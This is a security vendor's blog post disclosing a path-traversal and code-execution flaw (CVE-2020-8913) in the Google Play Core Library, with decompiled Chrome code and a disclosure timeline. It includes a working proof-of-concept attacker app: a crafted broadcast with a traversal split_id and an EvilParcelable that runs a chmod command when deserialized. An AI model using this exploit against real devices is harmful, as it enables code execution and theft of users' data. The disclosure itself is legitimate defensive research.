<!DOCTYPE html>
<html>
<head>

    <!-- Document Settings -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <link rel="apple-touch-icon" sizes="180x180" href="https://blog.oversecured.com/assets/images/apple-touch-icon.png}">
    <link rel="icon" type="image/png" sizes="32x32" href="https://blog.oversecured.com/assets/images/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://blog.oversecured.com/assets/images/favicon-16x16.png">
    <link rel="manifest" href="https://blog.oversecured.com/assets/images/site.webmanifes">
    <link rel="mask-icon" href="https://blog.oversecured.com/assets/images/safari-pinned-tab.svg" color="#5bbad5">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">

    <!-- Base Meta -->
    <!-- dynamically fixing the title for tag/author pages -->



    <title>Oversecured automatically discovers persistent code execution in the Google Play Core Library | Oversecured Blog</title>
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="https://blog.oversecured.com/assets/images/favicon.svg" type="image/png" />
    <meta property="og:site_name" content="News, Techniques & Guides" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Oversecured automatically discovers persistent code execution in the Google Play Core Library" />
    <meta property="og:description" content="The Google Play Core Library is a popular library for Android that allows updates to various parts of an app to be delivered at runtime without the participation of the user, via the Google API..." />
    <meta property="og:url" content="https://blog.oversecured.com/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/" />
    <meta property="og:image" content="https://blog.oversecured.com/assets/images/fourthArticleBack.png?56790864у5689" />
    <meta property="article:publisher" content="https://www.facebook.com/" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Oversecured automatically discovers persistent code execution in the Google Play Core Library" />
    <meta name="twitter:description" content="The Google Play Core Library is a popular library for Android that allows updates to various parts of an app to be delivered at runtime without the participation of the user, via the Google API..." />
    <meta name="twitter:url" content="https://blog.oversecured.com/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/" />
    <meta name="twitter:image:src" content="https://blog.oversecured.com/assets/images/fourthArticleBack.png?56790864у5689" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="News, Techniques & Guides" />
    <meta name="twitter:site" content="@OversecuredInc" />
    <meta name="twitter:creator" content="@OversecuredInc" />
    <meta property="og:image:width" content="2000" />
    <meta property="og:image:height" content="666" />
    <meta data-rh="true" name="robots" content="index,follow,max-image-preview:large">

    <!-- Styles'n'Scripts -->
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
    <!-- highlight.js -->
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
    <style>
        .hljs { background: none; }

        .markdown-in-single-quotes {
            word-break: break-word;
        }

        .heading-anchor > a {
            font-family: -apple-system, system-ui, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;;
            font-size: 40px !important;
            font-weight: 700;
            color: #000 !important;
        }

        .heading-anchor-small > a {
            font-size: 28px !important;
        }

        .heading-anchor:hover {
            text-decoration: underline;
            cursor: pointer;
        }

        .heading-anchor > a:hover {
            color: black !important;
        }

        .anchorjs-link:hover::after {
            color: black;
        }

        .heading-anchor:target {
            scroll-margin-top: 80px;
        }

        .post-full-content a {
            box-shadow: none;
        }

        .gdpr-notice {
            display: flex;
            align-items: center;
            position: fixed;
            z-index: 1000;
            bottom: 20px;
            right: 20px;
            background: #242424;
            border-radius: 15px;
            padding: 15px 20px;
        }

        .gdpr-notice__text {
            margin: 0;
            max-width: 400px;
            color: white;
            font-style: normal;
            font-weight: normal;
            font-size: 14px;
        }

        .gdpr-notice__btn-accept {
            background: #FFB400;
            border: 2px solid #FFB400;
            box-sizing: border-box;
            border-radius: 8px;
            font-style: normal;
            font-weight: bold;
            font-size: 14px;
            line-height: 17px;
            color: #FFFFFF;
            padding: 10px 40px;
            outline: none;
            transition: 0.3s;
        }

        .gdpr-notice__btn-accept:hover {
            opacity: 0.7;
        }

        .gdpr-notice__btn-accept:active {
            opacity: 1;
        }

        .gdpr-notice__link {
            color: white;
            text-decoration: underline;
        }

        .post-full-content > div > ul > li > a {
            color: #30c4fc;
        }

        .post-full-content > div > ul > li > a:hover {
            color: #3289b3;
        }

        .post-full-content > div > p > a {
            color: #30c4fc;
        }

        .post-full-content > div > p > a:hover {
            color: #3289b3;
        }

        .table {
            white-space: normal !important;
        }

        @media (max-width: 620px) {
            .gdpr-notice {
                display: flex;
                align-items: center;
                flex-direction: column;
                position: fixed;
                z-index: 1000;
                bottom: 0;
                right: 0;
                background: #242424;
                border-radius: 0;
                padding: 15px 20px;
                width: 100%;
            }

            .gdpr-notice__text {
                margin-bottom: 15px;
            }

            .heading-anchor > a {
                font-size: 25px !important;
                padding-left: 20px !important;
                display: block;
            }

            .anchor-item {
                padding: 0 !important;
                margin-left: -20px !important;
            }
        }

    </style>

    <!--[if IE]>
        <style>
            p, ol, ul{
                width: 100%;
            }
            blockquote{
                width: 100%;
            }
        </style>
    <![endif]-->

    <!-- This tag outputs SEO meta+structured data and other important settings -->
<!--    <meta name="description" content="The Google Play Core Library is a popular library for Android that allows updates to various parts of an app to be delivered at runtime without the participation of the user, via the Google API..." />
    <link rel="canonical" href="/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/" />
    <meta name="referrer" content="no-referrer-when-downgrade" />

    

    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Website",
    "publisher": {
        "@type": "Organization",
        "name": "News, Techniques & Guides",
        "logo": "/assets/images/blog-icon.png"
    },
    "url": "Jekyll::Drops::SiteDrop/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/",
    "image": {
        "@type": "ImageObject",
        "url": "/assets/images/fourthArticleBack.png",
        "width": 2000,
        "height": 666
    },
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/"
    },
    "description": "Oversecured is happy that we were able to create a technology that allows us to detect tricky vulnerabilities with a very low false-positive rate and be better than a researcher’s eye! Oversecured’s service is adapted to Android security and privacy. It can detect a lot of different attack vectors and"
}
    </script>

    <link rel="alternate" type="application/rss+xml" title="Oversecured automatically discovers persistent code execution in the Google Play Core Library" href="/feed.xml" />
-->

</head>
<body class="post-template">
<!--    <a id="notice" style="font-size: 16px; font-weight: 700" class="link-to-oversecured" target="_blank" href="https://oversecured.com/" rel="noopener">Visit Oversecured.com and get 3 free scans</a>-->
    <svg id="cross" class="link-to-oversecured__cross" width="11" height="11" viewBox="0 0 11 11" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.70711 9.70735C9.31658 10.0979 8.68342 10.0979 8.29289 9.70735L0.707107 2.12156C0.316582 1.73104 0.316582 1.09788 0.707107 0.707351C1.09763 0.316827 1.7308 0.316826 2.12132 0.70735L9.70711 8.29314C10.0976 8.68366 10.0976 9.31683 9.70711 9.70735Z" fill="white"/>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.70711 0.7072C10.0976 1.09772 10.0976 1.73089 9.70711 2.12141L2.12132 9.7072C1.7308 10.0977 1.09763 10.0977 0.707107 9.7072C0.316582 9.31668 0.316582 8.68351 0.707106 8.29299L8.29289 0.7072C8.68342 0.316676 9.31658 0.316676 9.70711 0.7072Z" fill="white"/>
    </svg>
    <div class="site-wrapper">
        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
        <!-- default -->

assign cover = page.cover


<!-- The tag above means: insert everything in this file
into the {body} of the default.hbs template -->
<header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
        
            
                <a class="site-nav-logo" href="/"><img src="/assets/images/blog-icon.png" alt="News, Techniques & Guides" /></a>
            
        
        
    </div>
    <div class="site-nav-right">
        <div class="social-links">
            
<!--            -->
<!--                <a class="social-link social-link-tw" href="https://twitter.com/OversecuredInc" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
</a>-->
<!--            -->
<!--        </div>-->
<!--        -->
<!--    </div>-->
</nav>

    </div>
</header>

<!-- Everything inside the #post tags pulls data from the post -->
<!-- #post -->

<main id="site-main" class="site-main outer" role="main">
    <div class="inner">

        <article class="post-full post tag-getting-started ">
            <header class="post-full-header">
                <section class="post-full-meta">
                    <time class="post-full-meta-date" datetime="28 August 2020">28 August 2020</time>
                    
                </section>
                <h1 class="post-full-title">Oversecured automatically discovers persistent code execution in the Google Play Core Library</h1>
            </header>

            
            <div class="post-full-image" style="background-image: url(/assets/images/fourthArticleBack.png)">
            </div>
            

            <section class="post-full-content">
                <div class="kg-card-markdown">
                    <p>Oversecured is happy that we were able to create a technology that allows us to detect tricky vulnerabilities with a very low false-positive rate and be better than a researcher’s eye! Oversecured’s service is adapted to Android security and privacy. It can detect a lot of different attack vectors and privacy issues (starting from known arbitrary code executions, theft/overwrite of arbitrary files, and ending with ability to theft user pictures, fake SMS messages, leak Android app logs, the full list is available  <a class="post-template__link-text--item" rel="noopener" href="https://oversecured.com/vulnerabilities" target="_blank">here</a>), the kernel tracks unsafe and potentially dangerous data from the browser, third-party apps, a network shared with an attacker, Bluetooth and NFC connections, SMS messages, local public storage, etc. We accept APK files (Android apps), decompile them to Java sources, and perform analysis against them. An Oversecured’s user will receive a report showing a trace of data in the app’s sources, displaying where the dangerous data is coming from, sources that will process that data, and the place where’s the vulnerability happens.</p>

<p class="heading-anchor"><a href="#summary">Summary</a></p>
<p>The Google Play Core Library is a popular library for Android that allows updates to various parts of an app to be delivered at runtime without the participation of the user, via the Google API. It can also be used to reduce the size of the main apk file by loading resources optimized for a particular device and settings (localization, image dimensions, processor architecture, dynamic modules) instead of storing dozens of different possible versions. The vulnerability we discovered made it possible to add executable modules to any apps using the library, meaning arbitrary code could be executed within them. An attacker who had a malware app installed on the victim’s device could steal users’ login details, passwords, and financial details, and read their mail.</p>

<p class="heading-anchor"><a href="#introduction">Introduction</a></p>
<p>Experts at Oversecured’s scanning kernel development department tested an update on several popular apps and discovered that something interesting had triggered the scanner. In many cases, we uncovered <a class="post-template__link-text--item" rel="noopener" href="https://oversecured.com/vulnerabilities#Theft_of_arbitrary_files" target="_blank">Theft of arbitrary files</a> and <a class="post-template__link-text--item" rel="noopener" href="https://oversecured.com/vulnerabilities#Overwriting_arbitrary_files" target="_blank">Overwriting arbitrary files</a> vulnerabilities in the Google Play Core library’s source code. Below we present a listing of the vulnerability from the report:</p>

<p><img class="post-template__vulnearbility-image" src="/assets/images/fourth-article-code-blocks.png" alt="vulnerability" /></p>

<p>An exploit was written to steal arbitrary files, and a draft report was written to send to Google. Subsequently, the scope for developing the attack was investigated. As a result, the updated exploit made it possible to substitute executable files and achieve the execution of arbitrary code. The testing took place on the Google Chrome app.</p>

<p class="heading-anchor"><a href="#fragment-of-the-vulnerable-code">Fragment of the vulnerable code</a></p>
<p>The Google Chrome app was decompiled with the deobfuscation option set, and fragments of the resulting code are presented below.</p>

<p class="markdown-in-single-quotes">An unprotected broadcast receiver in the file <code class="highlighter-rouge">com/google/android/play/core/splitinstall/C3748l.java</code> allows third-party apps to send specially crafted intents into it, forcing a vulnerable app to copy arbitrary files to arbitrary locations specified in the parameter <code class="highlighter-rouge">split_id</code> which is vulnerable to path-traversal.</p>

<p class="markdown-in-single-quotes">Registration of the unprotected broadcast receiver in the file <code class="highlighter-rouge">com/google/android/play/core/splitinstall/C3748l.java</code></p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="nf">C3748l</span><span class="o">(</span><span class="n">Context</span> <span class="n">context</span><span class="o">,</span> <span class="n">C3741e</span> <span class="n">eVar</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">(</span><span class="k">new</span> <span class="n">ae</span><span class="o">(</span><span class="s">"SplitInstallListenerRegistry"</span><span class="o">),</span> <span class="k">new</span> <span class="n">IntentFilter</span><span class="o">(</span><span class="s">"com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService"</span><span class="o">),</span> <span class="n">context</span><span class="o">);</span>
</code></pre></div></div>

<p class="markdown-in-single-quotes">File <code class="highlighter-rouge">com/google/android/play/core/listener/C3718a.java</code></p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="nf">C3718a</span><span class="o">(</span><span class="n">ae</span> <span class="n">aeVar</span><span class="o">,</span> <span class="n">IntentFilter</span> <span class="n">intentFilter</span><span class="o">,</span> <span class="n">Context</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">f22595a</span> <span class="o">=</span> <span class="n">aeVar</span><span class="o">;</span>
    <span class="k">this</span><span class="o">.</span><span class="na">f22596b</span> <span class="o">=</span> <span class="n">intentFilter</span><span class="o">;</span> <span class="c1">// intent filter with action `com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService`</span>
    <span class="k">this</span><span class="o">.</span><span class="na">f22597c</span> <span class="o">=</span> <span class="n">context</span><span class="o">;</span>
<span class="o">}</span>

<span class="kd">private</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">m15347a</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">((</span><span class="k">this</span><span class="o">.</span><span class="na">f22600f</span> <span class="o">||</span> <span class="o">!</span><span class="k">this</span><span class="o">.</span><span class="na">f22598d</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="o">.</span><span class="na">f22599e</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">f22599e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">C3719b</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">f22597c</span><span class="o">.</span><span class="na">registerReceiver</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">f22599e</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">f22596b</span><span class="o">);</span> <span class="c1">// registration of unprotected broadcast receiver</span>
</code></pre></div></div>

<p>allows third-party apps installed on the same device to broadcast arbitrary data here.</p>

<p class="markdown-in-single-quotes">The file <code class="highlighter-rouge">com/google/android/play/core/splitinstall/SplitInstallSessionState.java</code> processes the message received</p>

<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="n">SplitInstallSessionState</span> <span class="nf">m15407a</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">bundle</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nf">SplitInstallSessionState</span><span class="o">(</span><span class="n">bundle</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="s">"session_id"</span><span class="o">),</span> <span class="n">bundle</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="s">"status"</span><span class="o">),</span> <span class="n">bundle</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="s">"error_code"</span><span class="o">),</span> <span class="n">bundle</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="s">"bytes_downloaded"</span><span class="o">),</span> <span class="n">bundle</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="s">"total_bytes_to_download"</span><span class="o">),</span> <span class="n">bundle</span><span class="o">.</span><span class="na">getStringArrayList</span><span class="o">(</span><span class="s">"module_names"</span><span class="o">),</span> <span class="n">bundle</span><span class="o">.</span><span class="na">getStringArrayList</span><span class="o">(</span><span class="s">"languages"</span><span class="o">),</span> <span class="o">(</span><span class="n">PendingIntent</span><span class="o">)</span> <span class="n">bundle</span><span class="o">.</span><span class="na">getParcelable</span><span class="o">(</span><span class="s">"user_confirmation_intent"</span><span class="o">),</span> <span class="n">bundle</span><span class="o">.</span><span class="na">getParcelableArrayList</span><span class="o">(</span><span class="s">"split_file_intents"</span><span class="o">));</span> <span class="c1">// `split_file_intents` will be parsed</span>
<span class="o">}</span>
</code></pre></div></div>

<p class="markdown-in-single-quotes">In the file <code class="highlighter-rouge">com/google/android/play/core/internal/ab.java</code> the library copies content from the URI from <code class="highlighter-rouge">split_file_intents</code> into the <code class="highlighter-rouge">unverified-splits</code> directory under the name <code class="highlighter-rouge">split_id</code>, which is subject to path-traversal due to the absence of validation</p>

<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="o">(</span><span class="n">Intent</span> <span class="n">next</span> <span class="o">:</span> <span class="n">list</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">stringExtra</span> <span class="o">=</span> <span class="n">next</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"split_id"</span><span class="o">);</span>
    <span class="n">File</span> <span class="n">a</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">f22543b</span><span class="o">.</span><span class="na">mo32067a</span><span class="o">(</span><span class="n">stringExtra</span><span class="o">);</span> <span class="c1">// path traversal from `/data/user/0/{package_name}/files/splitcompat/{id}/unverified-splits/`</span>
    <span class="k">if</span> <span class="o">(!</span><span class="n">a</span><span class="o">.</span><span class="na">exists</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">this</span><span class="o">.</span><span class="na">f22543b</span><span class="o">.</span><span class="na">mo32067b</span><span class="o">(</span><span class="n">stringExtra</span><span class="o">).</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">bufferedInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">f21840a</span><span class="o">.</span><span class="na">getContentResolver</span><span class="o">().</span><span class="na">openFileDescriptor</span><span class="o">(</span><span class="n">next</span><span class="o">.</span><span class="na">getData</span><span class="o">(),</span> <span class="s">"r"</span><span class="o">).</span><span class="na">getFileDescriptor</span><span class="o">()));</span> <span class="c1">// data of `split_file_intents` intents</span>
        <span class="n">fileOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="n">a</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bArr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">4096</span><span class="o">];</span>
        <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
            <span class="kt">int</span> <span class="n">read</span> <span class="o">=</span> <span class="n">bufferedInputStream</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">bArr</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">read</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">break</span><span class="o">;</span>
            <span class="o">}</span>   
            <span class="n">fileOutputStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">bArr</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">read</span><span class="o">);</span>
</code></pre></div></div>

<p class="markdown-in-single-quotes">After further careful research, it emerged that the <code class="highlighter-rouge">verified-splits</code> folder contains verified apks with the current app’s signature, which are no longer verified in the future. When a file in that folder starts with a <code class="highlighter-rouge">config.</code> prefix, it will be added to the app’s runtime ClassLoader automatically. Using that weakness, the attacker can create a class implementing e.g. the <code class="highlighter-rouge">Parcelable</code> interface and containing malicious code and send their instances to the affected app, meaning the <code class="highlighter-rouge">createFromParcel(...)</code> method will be executed in their context during deserialization leading to local code execution.</p>

<h3 id="proof-of-concept">Proof of Concept</h3>
<p class="markdown-in-single-quotes">A Proof of Concept was created for the Google Chrome app: it executes the command <code class="highlighter-rouge">chmod -R 777 /data/user/0/com.android.chrome</code> in the context of the vulnerable app. It first launches the app’s main activity, as a result of which an unprotected receiver is registered in the Google Play Core library code. 3 seconds later it sends a command to the receiver, which causes the affected app to be added in its entirety to the default ClassResolver. After 5 seconds the attacking app sends the <code class="highlighter-rouge">EvilParcelable</code> object, which automatically executes the command on being deserialized. Deserialization happens automatically, due to the way Android works. When a component receives an Intent, all attached objects are deserialized on receipt of a value or state (the <code class="highlighter-rouge">Intent.hasExtra(name)</code> method).</p>

<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">APP</span> <span class="o">=</span> <span class="s">"com.android.chrome"</span><span class="o">;</span>

<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>

    <span class="n">Intent</span> <span class="n">launchIntent</span> <span class="o">=</span> <span class="n">getPackageManager</span><span class="o">().</span><span class="na">getLaunchIntentForPackage</span><span class="o">(</span><span class="n">APP</span><span class="o">);</span>
    <span class="n">startActivity</span><span class="o">(</span><span class="n">launchIntent</span><span class="o">);</span>

    <span class="k">new</span> <span class="nf">Handler</span><span class="o">().</span><span class="na">postDelayed</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="o">{</span>
        <span class="n">Intent</span> <span class="n">split</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
        <span class="n">split</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"file://"</span> <span class="o">+</span> <span class="n">getApplicationInfo</span><span class="o">().</span><span class="na">sourceDir</span><span class="o">));</span>
        <span class="n">split</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"split_id"</span><span class="o">,</span> <span class="s">"../verified-splits/config.test"</span><span class="o">);</span>

        <span class="n">Bundle</span> <span class="n">bundle</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Bundle</span><span class="o">();</span>
        <span class="n">bundle</span><span class="o">.</span><span class="na">putInt</span><span class="o">(</span><span class="s">"status"</span><span class="o">,</span> <span class="mi">3</span><span class="o">);</span>
        <span class="n">bundle</span><span class="o">.</span><span class="na">putParcelableArrayList</span><span class="o">(</span><span class="s">"split_file_intents"</span><span class="o">,</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Parcelable</span><span class="o">&gt;(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="n">split</span><span class="o">)));</span>

        <span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="s">"com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService"</span><span class="o">);</span>
        <span class="n">intent</span><span class="o">.</span><span class="na">setPackage</span><span class="o">(</span><span class="n">APP</span><span class="o">);</span>
        <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"session_state"</span><span class="o">,</span> <span class="n">bundle</span><span class="o">);</span>
        <span class="n">sendBroadcast</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
    <span class="o">},</span> <span class="mi">3000</span><span class="o">);</span>

    <span class="k">new</span> <span class="nf">Handler</span><span class="o">().</span><span class="na">postDelayed</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="o">{</span>
        <span class="n">startActivity</span><span class="o">(</span><span class="n">launchIntent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"x"</span><span class="o">,</span> <span class="k">new</span> <span class="n">EvilParcelable</span><span class="o">()));</span>
    <span class="o">},</span> <span class="mi">5000</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Code for the class that executes the command under the attacker’s control on deserialization</p>

<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="n">oversecured</span><span class="o">.</span><span class="na">poc</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">android.os.Parcelable</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">EvilParcelable</span> <span class="kd">implements</span> <span class="n">Parcelable</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Parcelable</span><span class="o">.</span><span class="na">Creator</span><span class="o">&lt;</span><span class="n">EvilParcelable</span><span class="o">&gt;</span> <span class="n">CREATOR</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Parcelable</span><span class="o">.</span><span class="na">Creator</span><span class="o">&lt;</span><span class="n">EvilParcelable</span><span class="o">&gt;()</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="n">EvilParcelable</span> <span class="nf">createFromParcel</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">os</span><span class="o">.</span><span class="na">Parcel</span> <span class="n">parcel</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">exploit</span><span class="o">();</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="n">EvilParcelable</span><span class="o">[]</span> <span class="nf">newArray</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">exploit</span><span class="o">();</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">private</span> <span class="kt">void</span> <span class="nf">exploit</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"chmod -R 777 /data/user/0/"</span> <span class="o">+</span> <span class="n">MainActivity</span><span class="o">.</span><span class="na">APP</span><span class="o">).</span><span class="na">waitFor</span><span class="o">();</span>
            <span class="o">}</span>
            <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">th</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">};</span>

    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">describeContents</span><span class="o">()</span> <span class="o">{</span> <span class="k">return</span> <span class="mi">0</span><span class="o">;</span> <span class="o">}</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">writeToParcel</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">os</span><span class="o">.</span><span class="na">Parcel</span> <span class="n">parcel</span><span class="o">,</span> <span class="kt">int</span> <span class="n">i</span><span class="o">)</span> <span class="o">{}</span>
<span class="o">}</span>
</code></pre></div></div>

<p class="heading-anchor"><a href="#conclusion">Conclusion</a></p>
<p>This vulnerability was assessed by Google as highly dangerous. It meant many popular apps, including Google Chrome, were vulnerable to arbitrary code execution. This could lead to leaks of users’ credentials and financial details, including credit card history; to interception and falsification of their browser history, cookie files, etc. To remove it, developers should update the Google Play Core library to the latest version and users should update all their apps.</p>

<p>Timeline <br />
02/26/2020 - Scanner triggered, first exploit to steal arbitrary files created <br />
02/27/2020 - Vulnerability studied in greater detail, exploit to execute arbitrary code created, information sent to Google <br />
04/06/2020 - Google confirmed the vulnerability has been fixed <br />
07/22/2020 - Google assigned CVE-2020-8913 <br /></p>


                </div>
            </section>

            <!-- Email subscribe form at the bottom of the page -->
            

            <footer class="post-full-footer">
                <!-- Everything inside the #author tags pulls data from the author -->
                <!-- #author-->
                
                    
                        <section class="author-card">
                            <meta property="og:image" content="assets/images/hannah-cover.jpg" />
                            <meta name="twitter:image" content="assets/images/hannah-cover.jpg" />
                            
                                <img class="author-profile-image" src="/assets/images/favicon.ico" alt="oversecured" />
                            
                            <section class="author-card-content">
                                <h4 class="author-card-name"><a href="/author/oversecured">oversecured</a></h4>
                                
